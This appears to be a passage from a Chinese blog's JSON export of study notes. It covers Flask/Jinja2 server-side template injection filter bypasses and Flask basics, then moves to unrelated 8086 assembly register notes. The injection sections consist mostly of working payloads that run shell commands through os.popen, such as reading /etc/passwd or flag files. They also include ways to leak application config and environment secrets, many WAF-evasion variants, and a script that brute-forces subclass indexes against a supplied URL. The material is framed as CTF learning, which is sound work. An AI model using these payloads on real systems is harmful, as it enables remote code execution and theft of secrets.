getitem(self,key):\n        b &#x3D; self.a[key]\n        return b\nt &#x3D; test()\nprint(t.getitem(&#39;2&#39;))\nclass test():\n    def __init__(self):\n        self.a&#x3D;&#123;\n            &#39;1&#39;:&#39;小红&#39;,\n            &#39;2&#39;:&#39;小绿&#39;,\n            &#39;3&#39;:&#39;小黄&#39;\n            &#125;\n    def __getitem__(self,key):\n        b &#x3D; self.a[key]\n        return b\nt &#x3D; test()\nprint(t[&#39;2&#39;])           #实体对象[&#39;key&#39;] 系统会自动调用__getitem__方法\n\n可以用来绕过[]过滤\n&#123; &#123;&#39;&#39;.__ckass__.__base__.__subclasses__().__getitem__(&#39;+ str(i) +&#39;)&#125; &#125;\n\n使用__getitem__()构造payload:\nimport requests\nurl &#x3D; input(&#39;请输入URL链接:&#39;)\nfor i in range(500):\n    data &#x3D; &#123;&quot;code&quot;:\n    &#39;&#123; &#123;&quot;&quot;.__class__.__base__.__subclasses__().__getitem__(&#39;+str(i)+&#39;)&#125; &#125;&#39;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;_wrap_close&#39; in response.text:\n                print(i,&quot;---&gt;&quot;,response.text)\n                break\n    except:\n        pass\npayload:\n&#123; &#123;&#39;&#39;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#39;popen&#39;)(&#39;cat &#x2F;etc&#x2F;passed&#39;).read()&#125; &#125;\n\n4.request绕过单双引号过滤request在flask中可以访问基于HTTP请求传递的所有信息此request并非python函数，而是在flask内部的函数\nrequest.args.key    获取get传入的key的值\nrequest.values.x1   所有参数 \nrequest.cookies     获取cookies传入参数 \nrequest.headers     获取请求头请求参数 \nrequest.form.key    获取post传入参数\n（Content-Type：applicaation／x-www-form-urlencoded或multipart／form-data） request.data        获取post传入参数（Content-Type：a／b） \nrequest.json        获取post传入json参数（Content-Type：application／json） \n\napp.py\nfrom flask import Flask, render template, request\n\napp&#x3D;Flask(__name__)\n\n@app.route(&#39;&#x2F;&#39;,methods &#x3D; [&#39;POST&#39;,&#39;GET&#39;]) \ndef show1():\n    return render_template(&#39;index.html&#39;) \n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run(host&#x3D;&#39;0.0.0.0&#39;) \n\nindex.html\n&lt;html lang&#x3D;&quot;en&quot;&gt; \n&lt;head&gt;\n&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; \n&lt;title&gt;过滤器的使用&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;br&gt;\n获取get提交数据： &#123; &#123;request.args.k1&#125; &#125;\n&lt;br&gt;\n获取post提交数据：&#123; &#123;request.form.k2&#125; &#125;\n&lt;br&gt;\n获取cookie提交数据：&#123; &#123;request.cookies.k3&#125; &#125;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n在构造payload时大多会用到单双引号，可以通过构造带 参数的url，配合request获取参数的内容来组成想要提交的指令，从而绕过单双引号的使用。\n#POST提交payload\n&#123; &#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;cat &#x2F;etc&#x2F;passwd&#39;).read()&#125; &#125;\n&#123; &#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.form.k1](requests.form.k2).read()&#125; &#125;&amp;k1&#x3D;popen&amp;k2&#x3D;cat &#x2F;etc&#x2F;passwd\n#cookie提交payload\n&#123; &#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;cat &#x2F;etc&#x2F;passwd&#39;).read()&#125; &#125;\n&#123; &#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.cookies.k1](request.cookies.k2).read()&#125; &#125;\n#Cookie:k1&#x3D;popen;k2&#x3D;cat &#x2F;etc&#x2F;passwd\n\n5.过滤器绕过下划线过滤过滤器1.过滤器通过管道符号（|）与变量连接，并且在括号中可能有可选的参数。2.可以链接到多个过滤器，一个过滤器的输出将应用与下一个过滤器。\napp.pyindex.html\n&#123; &#123;()|attr(&#39;__class__&#39;)|attr(&#39;__base__&#39;)&#125; &#125;\n#attr绕过下划线_过滤\n&#39;&#39;&#39;\n1.使用reques方法\nGET请求：URL&#x2F;?cla&#x3D;__class__\nPOST提交：code&#x3D;&#123; &#123;()|attr(request.args.cla)&#125; &#125;\n&#39;&#39;&#39;\n#&#123; &#123;&#39;&#39;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#39;popen&#39;)(&#39;cat &#x2F;etc&#x2F;passed&#39;).read()&#125; &#125;\n#例子：\n#GET提交：URL&#x2F;?cla&#x3D;__class__&amp;bas&#x3D;__base__&amp;sub&#x3D;__subclasses__&amp;ini&#x3D;__init__&amp;glo&#x3D;__globals__&amp;gei&#x3D;__getitem__\n#POST提交：&#123; &#123;&#39;&#39;|attr(request.args.cla)|attr(request.args.sub)()|attr(request.args.gei)(117)|attr(request.args.ini)|attr(request.args.glo)|attr(request.args.gei)(&#39;popen&#39;)(&#39;cat &#x2F;etc&#x2F;passwd&#39;)|attr(&#39;read&#39;)()&#125; &#125;\n&#39;&#39;&#39;\n2.使用unicode编码\n3.使用16位编码\n4.base64编码\n5.格式化字符串      %c %95即下划线\n&#39;&#39;&#39;\n\n6.中括号绕过点过滤点’.’被过滤1.用中括号代替点2.attr()绕过\n7.绕过关键字过滤过滤了”class””arg””from””value””int””global”等关键字\n以&quot;__class__&quot;为例\n1.字符编码\n2.最简单的拼接“+”：&#39;__cl&#39;+&#39;ass__&#39;\n3.使用Jinjia2中的&quot;~&quot;进行拼接：&#123; %set a&#x3D;&quot;__cla&quot;% &#125;&#123; %set b &#x3D; &quot;ss__&quot;% &#125;&#123; &#123;()[a~b]&#125; &#125;\n4.利用过滤器（reverse反转，replace替换，join拼接等）：\n&#123; %set a&#x3D;&quot;__ssalc__&quot;|reverse% &#125;&#123; &#123;()[a]&#125; &#125;\n5.利用python的char():\n&#123; %set chr&#x3D;url_for.__globals__[&#39;__builtins__&#39;].chr% &#125;&#123; &#123;&quot;&quot;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(95)%2bchr(95)]&#125; &#125;\n#为了避免字符串被过滤&#x2F;转义，基于chr()函数来生成整数编码的字符，并将其拼接成字符串。例如，在上面的代码中，chr(95)会生成一个下划线字符 &quot;_&quot; 的ASCII编码，chr(99)则对应着 &quot;c&quot; 字符，依次类推。\n\n\n8.length过滤器绕过数字过滤\n9.获取config文件有些flag可能在config文件中如果没有过滤，直接{ {config} }就能打开。&#x2F;&#x2F;姿势集里面有相关说明\n**flask内置函数**\nlipsum 可加载第三方库\nurl_for 可返回url路径\n#url_for:一个可以根据视图函数名或端点名称生成相应 URL 的函数。通过这个函数，我们可以在不硬编码URL的情况下引用不同的视图函数或端点，并构建出正确的URL路由。\nget_flashed_message 可获取消息\n#get_flashed_messages：一个在重定向期间获取Flash消息的函数。Flash消息通常用于在请求之间存储临时信息，比如表单提交后显示一个成功或失败的消息。\n**flask内置对象**\ncycler：一个轻量级的循环迭代器，可以用于生成一系列重复的值。\njoiner：一个字符串连接器，可以将多个字符串连接成一个字符串。\nnamespace：一个命名空间对象，可以在程序中组织变量和函数，避免命名冲突。\nconfig：一个配置管理器对象，可以读取和写入程序的配置文件参数。\nrequest：一个用于发送 HTTP 请求的对象，通常用于从网络上获取数据。\nsession：一个用于存储用户会话信息的对象，通常用于在Web应用程序中跟踪用户状态。\n可利用已加载内置函数或对象寻找被过滤字符串可利用内置函数调用current_app模块进而查看配置文件\ncurrent_app\n调用current_app相当于调用flask\n&#123; &#123;url_for.__globals__[&#39;current_app&#39;].config&#125; &#125;\n#当在 Flask 模板中调用 &#123; &#123; url_for.__globals__[&#39;current_app&#39;].config &#125; &#125; 时，实际上是通过获取 url_for 对应的全局命名空间中的 current_app 对象，进而获取当前应用程序的配置信息并输出。\n&#123; &#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125; &#125;\n10.混合过滤dict()和join\ndict(): #用来创建一个字典\njoin： #将一个序列中的参数值拼接成字符串\n&#123; %set a&#x3D;dict(nihao&#x3D;1)% &#125;&#123; &#123;a&#125; &#125;   \n#创建字典a，键名nihao，键值1\n&#123; %set a&#x3D;dict(__cla&#x3D;1,ss__&#x3D;2)|join% &#125;&#123; &#123;a&#125; &#125;  \n#创建字典a，join把参数值拼接成字符串\n获取符号\n利用flask内置函数和对象获取符号\n&#123; % set hao &#x3D; (&#123;&#125;|select()|string()) % &#125;&#123; &#123;hao&#125; &#125;\n&#123; % set hao &#x3D; (lipsum|string) % &#125;&#123; &#123;hao&#125; &#125;\n#获取下划线\n&#123; % set hao &#x3D; (self|string()) % &#125;&#123; &#123;hao&#125; &#125;\n#获取空格\n&#123; % set hao &#x3D; (self|string|urlencode) % &#125;&#123; &#123;hao&#125; &#125;\n#获取百分号\n&#123; % set hao &#x3D; (app.__doc__|string) % &#125;&#123; &#123;hao&#125; &#125;\n···类似的payload有很多\n在后面添加|list,然后根据返回的结果，通过hao[]去获取你需要的符号\n具体可以看示例2里面的payload\n\n示例1：WAF过滤  &#39;,&quot;,&#39;+&#39;,&#39;request&#39;,&#39;.&#39;,&#39;[&#39;,&#39;]&#39;\npayload原型:&#123; &#123;().__class__.__base__.__subclasses__()[117]&#125;.__init__.__globals__[&#39;popen&#39;](&#39;cat flag&#39;).read()&#125;\npayload：\n&#123; %set a&#x3D;dict(__class__&#x3D;1)|join% &#125;\n&#123; %set b&#x3D;dict(__base__&#x3D;1)|join% &#125;\n&#123; %set c&#x3D;dict(__subclasses__&#x3D;1)|join% &#125;\n&#123; %set d&#x3D;dict(__getitem__&#x3D;1)|join% &#125;\n&#123; %set e&#x3D;dict(__in&#x3D;1,it&#x3D;2)|join% &#125;\n&#123; %set f&#x3D;dict(__glo&#x3D;1,bals__&#x3D;2)|join% &#125;\n&#123; %set g&#x3D;dict(popen&#x3D;1)|join% &#125;\n&#123; %set kg&#x3D;&#123;&#125;|select()|string()|attr(d)(10)% &#125;     #空格\n&#123; %set i&#x3D;(dict(cat&#x3D;1)|join,kg,dict(flag&#x3D;2)|join)|join% &#125;\n&#123; %set r&#x3D;dict(read&#x3D;1)|join% &#125;\n&#123; &#123;()|attr(a)|attr(b)|attr(c)|attr(d)(117)|attr(e)|attr(f)|attr(d)(g)(i)|attr(r)()&#125; &#125;\n示例2：WAF过滤  &#39;,&quot;,&#39;_&#39;,&#39;0-9&#39;,&#39;.&#39;,&#39;[&#39;,&#39;]&#39;.&#39;\\&#39;,&#39;&#39;\npaylaod原型:&#123; &#123;lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__item__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)()&#125; &#125;\npayload:\n&#123; %set nine&#x3D;dict(aaaaaaaaa&#x3D;a)|join|count% &#125;\n&#123; %set eighteen&#x3D;nine+nine% &#125;\n&#123; %set pop&#x3D;dict(pop&#x3D;a)|join% &#125;\n&#123; %set xhx&#x3D;(lipsum|string|list)|attr(pop)(eighteen)% &#125;\n&#123; %set kg&#x3D;(lipsum|string|list)|attr(pop)(nine)% &#125;\n#得到下划线xhx&#39;_&#39;和空格kg&#39; &#39;\n&#123; %set globals&#x3D;(xhx,xhx,dict(globals&#x3D;a)|join,xhx,xhx)|join% &#125;\n&#123; %set getitem&#x3D;(xhx,xhx,dict(getitem&#x3D;a)|join,xhx,xhx)|join% &#125;\n&#123; %set os&#x3D;dict(os&#x3D;a)|join% &#125;\n&#123; %set popen&#x3D;dict(popen&#x3D;a)|join% &#125;\n&#123; %set flag&#x3D;(dict(cat&#x3D;a)|join,kg,dict(flag&#x3D;a)|join)|join&#125;\n&#123; %set read&#x3D;dict(read&#x3D;a)|join&#125;\n&#123; &#123;lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(flag)|attr(read)()&#125; &#125;\n\n姿势集(来源https://zhuanlan.zhihu.com/p/93746437)\n1.{ {config} } 可以获取当前设置，如果题目是这样的：app.config [&#39;FLAG&#39;] &#x3D; os.environ.pop（&#39;FLAG&#39;）\n\n可以直接访问 { {config[‘FLAG’]} } 或者 { {config.FLAG} } 得到 flag。\n2.同样可以找到 config。&#123; &#123;self.__dict__._TemplateReference__context.config&#125; &#125;\n&#39;&#39;&#39;\n这段代码可以用于获取当前 Flask 应用程序上下文中的配置信息。\n&#96;self&#96; 表示模板上下文对象，&#96;__dict__&#96; 返回该对象储存的属性和值的字典，\n&#96;_TemplateReference__context&#96; 是表示调用上下文槽时使用的内部插槽名称。\n最终访问 &#96;config&#96; 属性可以得到应用程序的配置信息。\n&#39;&#39;&#39;\n\n3.环境变量&#123; &#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__[&#39;os&#39;].__dict__[&#39;environ&#39;][&#39;FLAG&#39;]&#125; &#125;\n&#39;&#39;&#39;\n这段代码可以用于获取 Flask 程序中环境变量 &#96;&#39;FLAG&#39;&#96; 的值。\n首先创建一个空列表 &#96;[]&#96;，然后通过 &#96;. __class__&#96; 获取它的类 &#96;&lt;class &#39;list&#39;&gt;&#96;。\n再通过 &#96;.__base__&#96; 方法获取其基础类，即 &#96;&lt;class &#39;object&#39;&gt;&#96;。\n接着通过 &#96;.__subclasses__()&#96; 方法获取所有子类，得到一个列表。\n然后查询这个列表中下标为 &#96;68&#96; 的子类，得到 &#96;&lt;class &#39;posix.ScandirIterator&#39;&gt;&#96;。\n对该子类的 &#96;__init__&#96; 初始化函数进行取值并访问 &#96;__globals__[&#39;os&#39;].__dict__[&#39;environ&#39;][&#39;FLAG&#39;]&#96; \n就可以获取环境变量 &#96;&#39;FLAG&#39;&#96; 的值。\n&#39;&#39;&#39;\n\n4.url_for、g、request、namespace、lipsum、range、session、dict、get_flashed_messages、cycler、joiner、config等这是 Flask 中一些常用的对象或方法：\n&#39;&#39;&#39;\n- &#96;url_for&#96;：生成 URL。\n- &#96;g&#96;：应用程序上下文中存储数据的齿轮。在请求之间共享数据。\n- &#96;request&#96;：表示客户端发出的请求。\n- &#96;namespace&#96;：命名空间，常常用于优化 url_for。\n- &#96;lipsum&#96;：快速生成 Lorem Ipsum 文本。\n- &#96;range&#96;：Python 内置函数，用于生成一个固定区间内的整数序列。\n- &#96;session&#96;：应用程序上下文中用户会话存储数据的地方。在请求之间共享数据。\n- &#96;dict&#96;：Python 内置类型，字典类型，用于保存键-值对。\n- &#96;get_flashed_messages&#96;：从请求中弹出闪现消息。\n- &#96;cycler&#96;：Matplotlib 库中的循环器，用于对颜色、线条风格等元素进行迭代访问。\n- &#96;joiner&#96;：用于拼接字符串。\n- &#96;config&#96;：Flask 应用程序全局配置。\n&#39;&#39;&#39;\n\n如果上面提到的 config、self 不能使用，要获取配置信息，就必须从它的全局变量（访问配置 current_app 等）。例如：\n&#123; &#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125; &#125;\n#url_for.__globals__[&#39;current_app&#39;]，表示获取当前应用程序实例中的全局变量；\n#然后通过 config.FLAG 获取环境变量 FLAG 的值。\n&#123; &#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125; &#125;\n#get_flashed_messages.__globals__[&#39;current_app&#39;]，同样表示获取当前应用程序实例中的全局变量；\n#然后再次通过 config.FLAG 获取环境变量 FLAG 的值。\n#该函数主要用于传递闪现消息给用户，而在这里被“利用”以获取环境变量。\n&#123; &#123;request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]&#125; &#125;\n#在获取到 request 对象和 current_app 对象后，使用 _get_data_for_json() 方法将请求数据编码为 json 格式，\n#并使用 json 库进行编码。由于 flask 使用了自定义的 JSONEncoder 类，\n#所以我们通过 json.JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;] 来访问环境变量。\n\n5.过滤了 []、.pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。\n&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;etc&#x2F;passwd&#39;).read()\n\n在这里使用 pop 函数并不会真的移除，但却能返回其值，取代中括号来实现绕过。\n若.也被过滤，使用原生 JinJa2 函数 |attr()\n即将 request.__class__ 改成 request|attr(&quot;__class__&quot;)\n6.过滤下划线 _利用 request.args 的属性\n\n&#123; &#123; &#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125; &#125;&amp;class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__\n\n将其中的 request.args 改为 request.values，则利用 post 的方式进行传参。\nGET:\n\n&#123; &#123; &#39;&#39;[request.value.class][request.value.mro][2][request.value.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125; &#125;\n\nPOST:\nclass&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__\n\n7.过滤引号 “request.args 是 flask 中的一个属性，为返回请求的参数，这里把 path 当作变量名，将后面的路径传值进来，进而绕过了引号的过滤。\n&#123; &#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125; &#125;&amp;path&#x3D;&#x2F;etc&#x2F;passwd\n\n8.一些关键字被过滤。base64编码绕过用于__getattribute__使用实例访问属性时。\n例如，过滤掉 __class__ 关键词\n&#123; &#123;[].__getattribute__(&#39;X19jbGFzc19f&#39;.decode(&#39;base64&#39;)).__base__.__subclasses__()[40](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125; &#125;\n\n字符串拼接绕过\n&#123; &#123;[].__getattribute__(&#39;__c&#39;+&#39;lass__&#39;).__base__.__subclasses__()[40](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125; &#125;\n&#123; &#123;[].__getattribute__([&#39;__c&#39;,&#39;lass__&#39;]|join).__base__.__subclasses__()[40]&#125; &#125; ","slug":"ssti1","date":"2023-04-21T10:49:36.000Z","categories_index":"文章","tags_index":"ssti模板注入","author_index":"南瓜の无名"},{"id":"1e1792beaab2c135cf1beec290eff7af","title":"ssti模板注入学习笔记-flask前置知识","content":"flask是一个使用python编写的轻量级web应用框架\npython可以直接用flask启动一个web服务页面\ncd &#x2F;opt&#x2F;flask1\nsource .&#x2F;bin&#x2F;activate\ncd &#x2F;root\nvim demo.py\npython3 demo.py\n\n其中demo.py文件:\nfrom flask import Flask     #启动flask模块，创建一个Flask类\napp &#x3D; Flask(__name__)       #__name__是系统变量，指的是本py文件的文件名\n\n#路由：基于浏览器输入的字符串寻址\n@app.route(&#39;&#x2F;world&#39;)             \ndef hello():\n    return &quot;hello world&quot;\n@app.route(&#39;&#x2F;man&#39;)             \ndef hello():\n    return &quot;hello man&quot;\n\n#只能被python直接运行，而不能被作为组件或模块被调用\nif __name__&#x3D;&#x3D;&#39;__main__&#39;: \n    app.run(debug&#x3D;True,host&#x3D;&quot;0.0.0.0&quot;,port&#x3D;8081)      #改完配置自动生效\n    #debug建议只能在学习中开启  host&#x3D;&quot;0.0.0.0&quot;监听所有的物理接口\n\nflask变量规则通过向规则参数添加变量部分，可以动态构建URL\nfrom flask import Flask\napp &#x3D; Flask(__name__)\n\n@app.route(&#39;&#x2F;hello&#x2F;&lt;name&gt;&#39;)\ndef hello(name):\n    return &quot;hello %s&quot; % name\n@app.route(&#39;int&#x2F;&lt;ID&gt;&#39;)\ndef hello(ID):\n    return &quot;hello %d&quot; % ID\n\nif __name__&#x3D;&#x3D;&#39;__main__&#39;:\n    app.run(debug&#x3D;True)\n\nflask HTTP方法在python demo.py中插入路由:\n@app.route(&#39;&#x2F;login&#39;,methods&#x3D;[&#39;POST&#39;,&#39;GET&#39;])\ndef login():\n    if request.method &#x3D;&#x3D; &#39;POST&#39;:\n        print(1)\n        user &#x3D; request.form[&#39;ben&#39;]\n        return redirect(url_for(&#39;success&#39;,name &#x3D; user))     #redirect重定向\n    else:\n        print(2)\n        user &#x3D; request.args.get(&#39;ben&#39;)\n        return redirect(url_for(&#39;success&#39;,name &#x3D; user))\n\nflask模板视图函数：主要作用是生成请求的相应把业务逻辑和表现内容放在一起，会增加代码的复杂度和维护成本\n使用模板：使用静态的页面html展示动态的内容模板是一个响应文本的文件，其中使用占位符（变量）表示动态部分。代码结构清晰，耦合度低\n· 处理业务逻辑：视图函数只负责业务逻辑和数据处理\n· 返回相应内容：模板取到视图函数的数据结果来进行展示\n\nrender_template加载html文件，默认文件路径在templates目录下。\nfrom flask import Flask,render_template\napp &#x3D; Flask(__name__)\n\n@app.route(&#39;&#x2F;&#39;)\ndef index():\n    return render_template(&quot;index.html&quot;)\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run()\n\n在templates目录下创建index.html文件\n&lt;html lang&#x3D;&quot;en&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n    &lt;title&gt;Title&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n    模板html展示页面\n&lt;br&gt;\n    &#123;&#123;my_str&#125;&#125;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n两者结合：\nfrom flask import Flask,render_template\napp &#x3D; Flask(__name__)\n@app.route(&#39;&#x2F;&#39;)\ndef index():\n    my_str &#x3D; &#39;Hello world&#39;\n    my_int &#x3D; 12\n    my_array &#x3D; [5,2,0,1,3,1,4]\n    my_duct &#x3D; &#123;\n        &#39;name&#39; &#x3D; &#39;dazhuang&#39;,\n        &#39;age&#39;:18\n    &#125;\n    return render_template(&quot;index.html&quot;,\n    my_str&#x3D;my_str,\n    my_int&#x3D;my_int,\n    my_arry&#x3D;my_array,\n    my_dict&#x3D;my_dict\n    )\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run()\n\nrender_template_string用于渲染字符串，直接定义内容\nfrom flask import Flask,render_template\napp &#x3D; Flask(__name__)\n@app.route(&#39;&#x2F;&#39;)\ndef index():\n    my_str &#x3D; &#39;Hello world&#39;\n    my_int &#x3D; 12\n    my_array &#x3D; [5,2,0,1,3,1,4]\n    my_duct &#x3D; &#123;\n        &#39;name&#39; &#x3D; &#39;nannan&#39;,\n        &#39;age&#39;:18\n    &#125;\n    return render_template_string(&#39;&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt;&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;&lt;title&gt;Title&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;模板html展示页面&lt;br&gt;%d&lt;br&gt;%s&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&#39; % (my_int,my_str))\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run()\n\npython中的继承关系父类和子类（子类调用父类下的其他子类）~python flask脚本没有办法直接执行python指令object是父子关系的顶端，所有数据类型最终的父类都是object\nclass A:pass\nclass B(A):pass\nclass C(B):pass\nclass D(B):pass\nc &#x3D; c()\n\nprint(c.__class__)                              # &lt;class &#39;__main__.C&#39;&gt; 当前类C\nprint(c.__class__.__base__)                     # &lt;class &#39;__main__.B&#39;&gt; 当前类的父类B\nprint(c.__class__.__base__.__base__)            # &lt;class &#39;__main__.A&#39;&gt;\nprint(c.__class__.__base__.__base__.__base__)   # &lt;class &#39;object&#39;&gt;\nprint(c.__class__.__mro__)                      # 上面四个层层递进一起输出\nprint(c.__class__.__base__.__subclasses__())    # B下的所有子类（数组形式）\nprint(c.__class__.__base__.__subclasses__()[1]) #调用子类D\n\n魔术方法__class__           #查找当前类型的所属对象\n__base__            #沿着父子类的关系往上走一个\n__mro__             #查找当前类对象的所有继承类\n__subclasses__()    #查找父类下的所有子类\n\n简单的payload（注意类型）\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()&#125;&#125;\n&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()&#125;&#125;    #str类型\n&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;    #list类型\n&#123;&#123;().__class__.__base__.__subclasses__()&#125;&#125;    #元组类型\n\n然后，寻找一些关键的模块\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()&#125;&#125;\n#例如：os.wrap_close       #找到对应的列数\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117]&#125;&#125;\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117].__init__&#125;&#125;\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117].__init__.__globals__&#125;&#125;\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;\n# __builtins__提供对python的所有&quot;内置&quot;标识符的直接访问\n# eval()计算字符串表达式的值\n# popen()执行一个shell以运行命令来开启一个进程\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;cat &#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;\n#这里也可以直接调用\n\n\n\n\n","slug":"flask_study","date":"2023-04-14T10:49:36.000Z","categories_index":"文章","tags_index":"ssti模板注入","author_index":"南瓜の无名"},{"id":"c056fa5ea8e6220d71e866be2b6f171d","title":"8086汇编学习笔记_01","content":"一、寄存器（CPU工作原理）CPU概述\n\n运算器，控制器，寄存器等器件，这些器件靠内部总线相连；\n\n8086 CPU 有14个寄存器：\nAX BX CX DX SI DI SP BP IP CS SS DS ES PSW\n\n通用寄存器有8个, 又可以分成2组,\n一组是数据寄存器(4个),另一组是指针寄存器及变址寄存器(4个).\n\n1.数据寄存器分为:\n　　AH&amp;AL＝AX(accumulator)：累加寄存器，常用于运算;\n在乘除等指令中指定用来存放操作数,\n另外,所有的I&#x2F;O指令都使用这一寄存器与外界设备传送数据.\n　　BH&amp;BL＝BX(base)：基址寄存器，常用于地址索引；\n　　CH&amp;CL＝CX(count)：计数寄存器，常用于计数；\n常用于保存计算值,如在移位指令,循环(loop)和串处理指令中用作隐含的计数器.\n　　DH&amp;DL＝DX(data)：数据寄存器，常用于数据传递。\n　　他们的特点是,这4个16位的寄存器可以分为高8位: AH, BH, CH, DH.\n    以及低八位：AL,BL,CL,DL。这2组8位寄存器可以分别寻址，并单独使用。\n\n2.另一组是指针寄存器和变址寄存器，包括：\n　　SP（Stack Pointer）：堆栈指针，与SS配合使用，可指向目前的堆栈位置；\n　　BP（Base Pointer）：基址指针寄存器，可用作SS的一个相对基址位置；\n　　SI（Source Index）：源变址寄存器，可用来存放相对于DS段之源变址指针；\n　　DI（Destination Index）：目的变址寄存器，可用来存放相对于 ES 段之目的变址指针。\n\nDS(DATA SEGMENT)数据段寄存器，用于定义数据；\nCS(CODE SEGMENT)代码段寄存器，用于存放代码；\nSS(STACK SEGMENT)堆栈段寄存器，用于存放入栈数据；\nES(EXTRA SEGMENT)附加段寄存器，用于存放串操作的目的操作数和辅助存储；\n\nIP（instruction pointer）指令指针，与CS代码段配合使用，指向指令的偏移地址。\nFR（flag register）或PSW（programme status word）标志&#x2F;程序状态字寄存器，\n是一个特殊的寄存器，按位起作用，用来控制CPU的工作方式或存放相关指令的执行状态。\n有意义的有9位，其中6位状态位，3位控制位。状态位用来记录执行结果的状态。\n包括ZF（结果为0）、PF（结果中1的奇偶）、SF（正负符号）、\nCF（无符号数最高位进位值）、OF（结果溢出）、AF（辅助进位）；\n控制位包括DF（方向标志位，控制串处理指令中SI,DI的增减）、\nIF（中断允许）、TF（是否允许单步中断跟踪调试）。\n\n1. 通用寄存器8086 CPU所有的寄存器都是16位的，可以存放两个字节。\nAX BX CX DX 通用寄存器\nAX –&gt; AH + AL\n2. 字在寄存器中的存储一个字可以存在一个16位寄存器中；\n3. 几条汇编指令汇编指令不区分大小写；\nmov ax,18   将18送入AX      AX&#x3D;18add ax,8    将寄存器AX中的数值加上8     AX&#x3D;AX+8\n4. 物理地址CPU访问内存单元时要给出内存单元的地址。所有的内存单元构成的存储空间是一个一维的线性空间。\n我们将这个唯一的地址称为物理地址。\n5. 16位结构的CPU特征\n运算器一次最多可以处理16位的数据；\n\n寄存器的最大宽度为16位；\n\n寄存器和运算器之间的通路是16位；\n\n\n6. 8086 CPU给出物理地址的方法8086有20位地址总线，可传送20位地址，寻址能力为1M。\n8086内部为16位结构，它只能传送16位的地址，表现出的寻址能力却只有64KB。\n\n地址加法器工作原理:\n\n段地址x16+偏移地址&#x3D;物理地址\n# 段地址x16 --&gt; 数据左移4位\n\n7. 段的概念内存并没有分段。\n段的划分来自于CPU，由于8086 CPU用“段地址x16+偏移地址&#x3D;物理地址”的方式给存储内存单元的物理地址，使得我们可以用分段的方式是来管理内存。\n段地址x16必然是16的倍数，所以一个段的起始地址也一定是16的倍数；偏移地址为16位，16位地址的寻址能力为64k，所以一个段的长度最大为64k；\n8. 内存单元地址小结CPU访问内存单元时，必须向内存提供内存单元的物理地址；8086 CPU在内部用段地址和偏移地址移位相加的方法形成最终的物理地址。\n9. 段寄存器段寄存器时提供段地址的。\nCS DS SS ES 段寄存器\n当8086 CPU要访问内存时，由这4个段寄存器提供内存单元的段地址。\n10. CS和IPCS和IP时8086 CPU中最关键的寄存器，他们指示了CPU当前要读取指令的地址。\n\nCS为代码段寄存器；\nIP为指令指针寄存器。\n\n\n8086 